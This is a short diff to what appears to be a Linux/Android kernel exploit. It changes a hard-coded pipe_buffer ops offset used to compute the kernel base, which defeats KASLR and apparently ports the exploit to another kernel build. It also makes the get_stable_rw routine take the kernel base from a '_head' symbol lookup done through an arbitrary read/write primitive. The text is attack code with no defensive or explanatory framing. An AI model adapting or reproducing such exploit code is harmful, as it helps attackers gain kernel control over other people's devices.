@@ -568,7 +568,7 @@ u64 noop_kbase(struct rw_info *rw) {
 u64 offset_kbase(struct rw_info *rw) {
     //return rw->ki.pipe_buffer_ops - OFFCHK(dev_config->kconsts.kernel_offsets.k_anon_pipe_buf_ops);
     // MODIFIED
-    return rw->ki.pipe_buffer_ops - (0xffffffc00a03f868 - 0xffffffc008000000);
+    return rw->ki.pipe_buffer_ops - (0xffffffc012024da8 - 0xffffffc008000000);
 }
 
 static inline u64 find_kbase(struct rw_info *rw) {
@@ -754,6 +754,10 @@ int get_stable_rw(struct rw_info *rw) {
 
     size_t _head_symbol = kallsyms_lookup_name(rw, "_head");
     LOGD("_head symbol: %p\n", _head_symbol);
+
+    if (_head_symbol != 0) {
+        rw->ki.kernel_base = _head_symbol;
+    }
 
     if (!rw->ki.kernel_base) {
         rw->ki.kernel_base = kallsyms_lookup_name(rw, "_head");
